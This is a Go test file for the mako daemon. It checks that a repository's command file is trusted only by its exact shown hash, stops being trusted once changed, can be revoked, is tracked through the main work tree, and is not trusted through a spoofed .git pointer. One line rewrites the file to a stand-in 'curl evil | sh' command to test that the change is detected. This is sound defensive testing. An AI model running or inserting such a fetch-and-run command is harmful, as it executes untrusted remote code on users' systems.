package daemon

import (
	"context"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/ironpark/mako/internal/client"
	"github.com/ironpark/mako/internal/config"
	"github.com/ironpark/mako/internal/gitstat"
	"github.com/ironpark/mako/internal/protocol"
	"github.com/ironpark/mako/internal/repotrust"
)

// trustDaemon is a daemon run with the configuration directory home, given
// it by MAKO_HOME alone, and a client of it.
func trustDaemon(t *testing.T) (c *client.Client, home string) {
	t.Helper()
	home = t.TempDir()
	t.Setenv("MAKO_HOME", home)
	cfg := config.Default()
	cfg.P2P.Disabled = true
	d := New(cfg, slog.New(slog.NewTextHandler(io.Discard, nil)))
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan error, 1)
	go func() { done <- d.Run(ctx) }()
	t.Cleanup(func() { cancel(); <-done })
	select {
	case <-d.Ready():
	case <-time.After(5 * time.Second):
		t.Fatal("daemon did not become ready")
	}
	c, err := client.Dial(t.Context(), d.Socket())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = c.Close() })
	return c, home
}

// A front-end shows a repository's command file and trusts it as shown,
// through the daemon, which keeps the trust in the configuration directory
// it runs with, though New was given none.
func TestRepoTrustThroughTheDaemon(t *testing.T) {
	c, home := trustDaemon(t)
	ctx := t.Context()

	repo := t.TempDir()
	if err := os.MkdirAll(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatal(err)
	}
	file := filepath.Join(repo, ".mako", "worktree.toml")
	if err := os.MkdirAll(filepath.Dir(file), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(file, []byte("setup_cmd = \"make\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	show := func() *protocol.TrustedFile {
		t.Helper()
		info, err := c.RepoTrust(ctx, &protocol.RepoTrust{Path: file})
		if err != nil || len(info.GetFiles()) != 1 {
			t.Fatalf("show = %v, %v", info, err)
		}
		return info.GetFiles()[0]
	}
	f := show()
	if f.GetTrusted() || f.GetPath() != ".mako/worktree.toml" || string(f.GetContent()) != "setup_cmd = \"make\"\n" {
		t.Fatalf("shown = %+v", f)
	}
	if _, err := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustAllow, Path: file}); err == nil {
		t.Fatal("trusted without the hash shown")
	}
	if _, err := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustAllow, Path: file, Sha256: f.GetSha256()}); err != nil {
		t.Fatal(err)
	}
	if !show().GetTrusted() {
		t.Fatal("not trusted once trusted")
	}
	if !repotrust.Open(home).Trusted(repo, ".mako/worktree.toml", []byte("setup_cmd = \"make\"\n")) {
		t.Fatal("the trust is not kept in the configuration directory")
	}

	// A file that changed after it was shown is not trusted as shown.
	if err := os.WriteFile(file, []byte("setup_cmd = \"curl evil | sh\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if show().GetTrusted() {
		t.Fatal("a changed file is still trusted")
	}
	if _, err := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustAllow, Path: file, Sha256: f.GetSha256()}); !protocol.HasCode(err, protocol.CodeChanged) {
		t.Fatalf("a file that changed since it was shown: %v, want code %q", err, protocol.CodeChanged)
	}

	list, err := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustList})
	if err != nil || len(list.GetFiles()) != 1 || list.GetFiles()[0].GetSha256() != f.GetSha256() {
		t.Fatalf("list = %v, %v", list, err)
	}
	gone, err := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustRevoke, Path: repo})
	if err != nil || len(gone.GetFiles()) != 1 {
		t.Fatalf("revoke = %v, %v", gone, err)
	}
	if list, _ := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustList}); len(list.GetFiles()) != 0 {
		t.Fatalf("left after revoke = %v", list)
	}

	outside := filepath.Join(t.TempDir(), "x.toml")
	if err := os.WriteFile(outside, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := c.RepoTrust(ctx, &protocol.RepoTrust{Path: outside}); err == nil {
		t.Fatal("showed a file of no repository")
	}
	if _, err := c.RepoTrust(ctx, &protocol.RepoTrust{Path: "relative/x"}); err == nil {
		t.Fatal("took a relative path")
	}
}

// A file named in a linked worktree is the same file of the repository's
// main work tree, which what runs a repository's commands reads and checks
// the trust of: that one is shown and trusted, by the main work tree. A
// folder whose .git file points into the repository, which does not list
// it as a worktree, is its own repository, and trusts nothing of it.
func TestRepoTrustIsKeptByTheMainWorkTree(t *testing.T) {
	c, home := trustDaemon(t)
	ctx := t.Context()
	repo, git := gitRepo(t)
	const rel = ".mako/commands.toml"
	write := func(root, body string) string {
		t.Helper()
		p := filepath.Join(root, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
		return p
	}
	write(repo, "cmd = \"main\"\n")
	git("add", "-A")
	git("commit", "-q", "-m", "commands")
	linked := filepath.Join(t.TempDir(), "linked")
	git("worktree", "add", "-q", "-b", "wt", linked)
	inLinked := write(linked, "cmd = \"the worktree's own\"\n")
	main, _ := filepath.EvalSymlinks(repo)

	info, err := c.RepoTrust(ctx, &protocol.RepoTrust{Path: inLinked})
	if err != nil || len(info.GetFiles()) != 1 {
		t.Fatalf("show = %v, %v", info, err)
	}
	f := info.GetFiles()[0]
	if f.GetRoot() != main || f.GetPath() != rel || string(f.GetContent()) != "cmd = \"main\"\n" {
		t.Fatalf("shown %q of %q: %q, want the main work tree's", f.GetPath(), f.GetRoot(), f.GetContent())
	}
	if _, err := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustAllow, Path: inLinked, Sha256: f.GetSha256()}); err != nil {
		t.Fatal(err)
	}
	// As what runs the repository's commands checks it, from either.
	store := repotrust.Open(home)
	for _, dir := range []string{repo, linked} {
		if !store.Trusted(gitstat.Repo(dir), rel, []byte("cmd = \"main\"\n")) {
			t.Errorf("not trusted for a session in %s", dir)
		}
	}

	// Revoking it there forgets it too.
	if gone, err := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustRevoke, Path: inLinked}); err != nil || len(gone.GetFiles()) != 1 {
		t.Fatalf("revoke in the worktree = %v, %v", gone, err)
	}
	if store.Trusted(main, rel, []byte("cmd = \"main\"\n")) {
		t.Fatal("still trusted once revoked in the worktree")
	}

	// A file only the worktree has is not one mako reads.
	only := filepath.Join(linked, "only.toml")
	if err := os.WriteFile(only, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := c.RepoTrust(ctx, &protocol.RepoTrust{Path: only}); err == nil || !strings.Contains(err.Error(), "main work tree") {
		t.Fatalf("a file only the worktree has: %v", err)
	}

	// A .git file naming the worktree's git directory does not make a
	// folder the repository's.
	spoof := t.TempDir()
	if err := os.WriteFile(filepath.Join(spoof, ".git"), []byte("gitdir: "+filepath.Join(repo, ".git", "worktrees", "linked")+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	inSpoof := write(spoof, "cmd = \"main\"\n")
	info, err = c.RepoTrust(ctx, &protocol.RepoTrust{Path: inSpoof})
	if err != nil || len(info.GetFiles()) != 1 {
		t.Fatalf("show = %v, %v", info, err)
	}
	own, _ := filepath.EvalSymlinks(spoof)
	if f := info.GetFiles()[0]; f.GetRoot() != own || f.GetTrusted() {
		t.Fatalf("a folder pointing into the repository shown as %q, trusted %v", f.GetRoot(), f.GetTrusted())
	}
	if store.Trusted(gitstat.Repo(spoof), rel, []byte("cmd = \"main\"\n")) {
		t.Fatal("a folder pointing into the repository is trusted as it")
	}
}
